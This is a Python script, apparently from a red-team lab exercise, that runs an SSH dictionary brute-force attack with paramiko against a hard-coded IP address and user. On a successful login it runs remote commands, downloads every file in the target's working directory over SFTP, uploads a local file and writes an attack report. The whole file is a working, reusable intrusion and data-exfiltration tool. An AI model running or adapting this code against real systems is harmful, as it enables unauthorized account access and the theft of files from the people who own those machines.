from datetime import datetime

import os
import paramiko
import shutil
import time


DICT_CLAVES = "dict.txt"
RUTA_LOCAL = os.getcwd()
HOST = "74.179.81.132"
USUARIO = "labssh"
# Lista de comandos para ejecutar dentro de la conexion SSH
COMANDOS = [
    "ls -lha",
    "ls",
    "cat dict.txt",
    ]


def cargar_dict():
    """
    Carga el diccionario de contraseñas para realizar el ataque brute_force
    Retorna:
        claves: Lista con las posibles contraseñas
    """
    ruta_dict = RUTA_LOCAL+"/"+DICT_CLAVES
    claves = [] # Lista de contraseñas
    try:
        with open(ruta_dict, "r") as archivo:
            for linea in archivo:
                claves.append(linea.strip()) # Agrega cada palabra a la lista
            return claves
    except FileNotFoundError:
        print(f"El archivo '{ruta_dict}' no fue encontrado.")
        
        
def fuerza_bruta_ssh(lista_claves):
    """
    Realiza el ataque de fuerza bruta, probando cada contraseña del diccionario
    Arg:
        lista_claves:
    Variables:
        host: IP del equipo objetivo
        port: Uso del puerto 22
        username: Usuario en VM Azure, creado para la prueba "labssh"
    """
    # Valida que se cargaran las contraseñas correctamente
    if lista_claves == None:
        print("No se ha cargado el diccionario")
        return
    
    reporte_ssh = "----- Detalles de Ataque de Diccinario -----"
    intentos = 0
        
    # Se incia una instancia SSH
    cliente_ssh = paramiko.SSHClient()
    cliente_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Recorre cada contraseña de la lista
    for clave in lista_claves:
        try:
            print(f"\nProbando contraseña: {clave}")
            # Intenta establecer la conexion 
            cliente_ssh.connect(HOST, port=22, username=USUARIO, password=str(clave), look_for_keys=False, allow_agent=False)
            print("Autenticación exitosa!\n\n")
            print(f"[+] Conexión establecida hacia {HOST}......\n")
            print("-" * 40)

            reporte_ssh += (
                f"Inicio de conexión SSH: {datetime.now()}\n"
                f"Conexión establecida con el Host: {HOST}\n"
                f"Usuario: {USUARIO}\n"
                f"Contraseña: {clave}\n"
                f"Cantidad de intentos fallidos: {intentos}\n\n"
                )

            # Lista de comandos para ejecutar dentro de la conexion SSH
#            lista_comandos = ["ls -lha",
#                              "ls",
#                              "cat dict.txt",
#                              ]
            
            print(f"Ejecutando los comandos: {COMANDOS}")

            dict_salidas = {} # Dict con la respuesta al comando (correcta o error)

            for comando in COMANDOS:
                try:
                    # Se corre cada comando en la lista (.exec_command)
                    stdin, stdout, stderr = cliente_ssh.exec_command(f"{comando}")
                    resp_ok = stdout.read().decode() # salida OK
                    resp_error = stderr.read().decode() # salida error

                    dict_salidas[comando] = [resp_ok, resp_error]

                except Exception as e:
                    error = f"Error al ejecutar el comando '{comando}': {e}\n"
                    print(error)
                    dict_salidas[comando] = [error]

            # Se ejecuta la transferencia de archivos hacia ambos lados
            repo_sftp = transferir_archivos(cliente_ssh)

            # Se cierra la sesion
            cliente_ssh.close()
            reporte_ssh += f"Cierre de conexión SSH: {datetime.now()}\n"
            
            return dict_salidas, reporte_ssh, repo_sftp 

        except paramiko.AuthenticationException:
            print(f"Intento de autenticación fallido.\n")
            intentos += 1
        except Exception as e:
            print(f"Error: {e}\n")
            break


def transferir_archivos(conexion_ssh):
    """
    Funcion para establecer una conexion sftp (transferir archivos usando SSH)
    Arg:
        conexion_ssh: Conexion SSH ya establecida
    Retorna:
        xxx
    """

    reporte_sftp = ("-----Información de conexión SFTP-----\n\n")

    try:
        cliente_sftp = conexion_ssh.open_sftp() # Se inicia la conexion sftp
        lista_archivos = cliente_sftp.listdir() # Se listan los archivos en el dir actual

        reporte_sftp += (f"Inicio de conexión SFTP: {datetime.now()}\n")

        if lista_archivos:
            ruta_repo_ssh = "Reportes_Red_Team/Reporte_SSH_Brute/Archivos_Extraidos"
            # Se valida o crea la ruta para guardar archivos extraidos del objetivo
            os.makedirs(ruta_repo_ssh, exist_ok=True)

            reporte_sftp += (
                "---Detalle de descarga de archivos---\n"
                f"Cantidad de archivos: {len(lista_archivos)}\n"
                )
            print("\nArchivos encontrados... Descagando...\n")

            cant_descargados = 0
            for archivo in lista_archivos:
                try:
                    # Se extrae copia de cada archivo del directorio actual hacia nuestro equipo
                    cliente_sftp.get(archivo, ruta_repo_ssh+"/"+archivo)
                    descarga = f"Archivo: {archivo} descargado.\n"
                    print(descarga)
                    reporte_sftp += descarga
                    cant_descargados += 1
                except:
                    error_des = f"\nError al descargar el archivo: {archivo}\n"
                    print(error_des)
                    reporte_sftp += error_des
            print("-" * 40)

        print("Subiendo archivo local.....\n")
        reporte_sftp += ("---Detalle de subida de archivos---\n")
        try:
            # Se envia un archivo local al host objetivo
            cliente_sftp.put(RUTA_LOCAL+"/dict.txt", "/home/labssh/dict.txt")
            print("Archivo subido con exito\n")
            reporte_sftp += (f"Archivo subido: dict.txt\n")
        except:
            error_sub = f"Error al subir el archivo local\n"
            print(error_sub)
            reporte_sftp += error_sub
        
        # Se cierra la conexión sftp
        cliente_sftp.close()
        reporte_sftp += (f"Cierre de conexión SFTP: {datetime.now()}\n")

        return reporte_sftp

    except Exception as e:
        error_sftp = f"Error al establecer la conexion sftp: {e}"
        print(error_sftp)
        reporte_sftp += error_sftp


def obtener_fecha_hora():
    """
    Devuelve la fecha y hora actual con formato YYYY-MM-DD_HH-MM-SS.
    """
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")


def guardar_reporte(dict_comm, ssh_repo, sftp_repo):
    """
    Guarda un reporte del ataque de fuerza bruta en un archivo .txt
    Arg:
        dict_comm: Reporte de datos obtenidos en el envio de paquetes
        ssh_repo: Reporte de datos obtenidos en la captura de trafico
        sftp_repo: 
    """

    try:
        print("-" * 70)
        print("\nGenerando reporte de Brute Force.....\n")
        timestamp = obtener_fecha_hora()
        
        # Se definen los nombres de los reportes segun el timestamp
        nombre_reporte = f"reporte_ssh_brute_{timestamp}.txt"

        with open(nombre_reporte, "w", encoding="utf-8") as archivo:
            archivo.write(f"=== REPORTE DE BRUTE FORCE - ({timestamp}) ===\n\n")
            archivo.write(ssh_repo)
            for comm, salidas in dict_comm.items():
                archivo.write(f"Comando: {comm}\n"
                              f"Salida OK: {salidas[0]}\n"
                              f"Salida Error: {salidas[1]}\n")

        # Valida que exista o crea la ruta "Reportes_Red_Team/Reportes_Packet_Attack"
        os.makedirs("Reportes_Red_Team/Reporte_SSH_Brute", exist_ok=True)

        # Ruta completa del reporte
        ruta_completa = os.path.join("Reportes_Red_Team/Reporte_SSH_Brute/", nombre_reporte)

        # Mueve el archivo al directorio Reporte_SSH_Brute
        shutil.move(nombre_reporte, ruta_completa)
        
        print("[+] Reporte guardado en: RReportes_Red_Team/Reporte_SSH_Brute/\n")
    except OSError as e:
        print(f"[!] Error guardando reporte: {e}\n")
    print("-" * 70)


if __name__ == "__main__":
    lista_claves = cargar_dict()
    dict, ssh, sftp = fuerza_bruta_ssh(lista_claves)
